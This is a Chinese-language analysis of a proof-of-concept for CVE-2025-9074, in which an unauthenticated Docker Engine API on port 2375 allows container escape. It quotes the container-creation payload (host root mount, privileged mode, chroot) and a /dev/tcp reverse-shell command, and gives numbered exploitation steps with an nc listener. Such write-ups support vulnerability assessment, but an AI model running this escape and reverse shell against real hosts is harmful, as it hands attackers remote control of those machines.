## CVE-2025-9074 - Docker Desktop, Docker Engine API Remote Code Execution (RCE)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** Remote Code Execution (RCE)

**影响应用:** Docker Desktop, Docker Engine API

**危害等级:** High Risk

**CVSS评分:** N/A

**影响版本:** 所有配置了无需认证即可访问Docker Engine API的版本，特别是在默认子网192.168.65.7:2375上暴露API的Docker Desktop环境。此问题不受增强容器隔离（ECI）或TCP暴露设置的影响，表明其影响范围广泛，不限于特定软件版本号。

**利用条件:** 需要攻击者能够通过网络访问目标系统上暴露的Docker Engine API（通常是端口2375），且该API无需认证即可访问。漏洞利用的前提是Docker API在主机上以不安全的方式（无认证）对外开放。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

### POC有效性分析
提供的`exploit.sh`脚本是一个高度有效且功能完整的Bash脚本，专门用于利用Docker Engine API的未授权访问漏洞CVE-2025-9074。该脚本通过一系列标准的`curl`命令与目标Docker API进行交互，实现了容器逃逸和远程代码执行。

首先，脚本通过查询`http://$TARGET_IP:$TARGET_PORT/images/json`来发现目标Docker主机上可用的镜像，优先选择“alpine”镜像，如果没有找到则选择第一个可用的镜像。这一步骤确保了容器创建的成功率。

其核心利用逻辑在于容器的创建过程：脚本向`http://$TARGET_IP:$TARGET_PORT/containers/create`发送一个精心构造的POST请求。请求体中的`HostConfig`字段是关键：
*   `"Binds": ["$MOUNT:/host"]`：默认将宿主机的根目录（`/`）挂载到新建容器的`/host`路径。这是容器逃逸的关键一步，允许容器访问宿主机的文件系统。
*   `"Privileged": true`：赋予容器特权模式，使其拥有更多的宿主机权限，进一步增强了逃逸能力。
*   `"NetworkMode": "host"`：让容器直接使用宿主机的网络命名空间，方便反向shell的连接。

最关键的`"Cmd"`参数设置为`["sh", "-c", "chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"]`。这条命令指示容器在启动后，利用`chroot /host`切换根目录到宿主机的根目录，然后在宿主机的上下文中执行一个反向shell命令`sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1`。这将导致宿主机向攻击者指定的监听地址和端口建立一个交互式shell连接。

脚本在执行过程中包含了基本的错误处理，例如检查监听参数是否提供、是否找到可用镜像、是否成功获取容器ID等，提升了其健壮性。整个利用过程自动化，无需人工干预，只需提供目标IP、端口以及攻击者的监听IP和端口即可。因此，该POC脚本在技术上非常成熟，能够可靠地复现并利用CVE-2025-9074漏洞，导致宿主机的远程代码执行。

### 利用步骤
1.  **准备监听器**：在攻击者的控制机器上，启动一个网络监听器以接收反向shell。例如，使用`netcat`：`nc -lvnp <LPORT>`。
2.  **获取POC脚本**：将`exploit.sh`脚本下载到攻击者的机器上，并赋予执行权限：`chmod +x exploit.sh`。
3.  **识别目标**：确定目标Docker主机的IP地址和暴露的Docker Engine API端口（通常是2375）。例如，如果目标IP是`192.168.65.7`，端口是`2375`。
4.  **执行POC**：运行`exploit.sh`脚本，指定目标IP、目标端口、攻击者监听IP和监听端口。
    示例命令：`./exploit.sh 192.168.65.7 2375 -l <YOUR_LISTENER_IP> -p <YOUR_LISTENER_PORT>`。
5.  **验证RCE**：一旦脚本成功执行，攻击者在第一步启动的`netcat`监听器上将收到一个来自目标宿主机的反向shell连接。通过此shell，攻击者将能够在目标宿主机上执行任意命令，从而获得远程代码执行能力，并可能访问宿主机文件系统中的用户文件。

### 投毒风险分析
对`exploit.sh`脚本的分析显示，其投毒风险极低，评估为5%。此POC的目的是演示CVE-2025-9074漏洞的利用方式，以实现容器逃逸并获取宿主机的反向shell。脚本代码逻辑清晰，完全由Bash语言编写，并仅依赖标准的系统工具（如`curl`、`grep`、`cut`等）。

具体分析如下：
*   **代码透明度**：脚本没有任何形式的代码混淆。所有命令和参数都清晰可见，易于审计和理解。
*   **依赖性**：脚本没有引入任何外部的、非标准的第三方库或二进制文件。它仅使用了操作系统自带或普遍存在的工具，降低了引入未知恶意代码的风险。
*   **网络行为**：除了与目标Docker API进行HTTP通信（这是漏洞利用的核心）和向攻击者指定的IP/端口建立反向shell连接（这是预期结果）之外，脚本没有发起任何其他可疑的网络请求，例如下载额外的可执行文件、向第三方服务器发送数据等。
*   **文件系统操作**：脚本主要通过Docker API创建容器并挂载宿主机根目录，然后通过`chroot`在宿主机上下文中执行命令。它本身没有进行任何未经授权的文件创建、修改、删除或篡改系统配置的操作。其最终效果是在宿主机上执行了反向shell，这属于渗透测试中的标准操作，旨在获取控制权而非造成破坏。
*   **恶意负载**：反向shell命令`sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1`是一个标准且常见的Payload，用于在目标系统上建立一个交互式shell。它本身并不包含破坏性或持久化的恶意功能。恶意行为的实际发生取决于攻击者在获得shell后执行的命令，而不是POC脚本本身。

鉴于以上分析，该POC脚本被认为是一个合法的安全研究工具，用于验证和复现漏洞。防御性安全研究人员可以安全地使用此POC来测试组织的Docker环境是否存在此漏洞，从而建立有效的防御措施，例如确保Docker Engine API不被未授权访问，或者限制其网络暴露面。

**项目地址:** N/A

**漏洞详情:** N/A
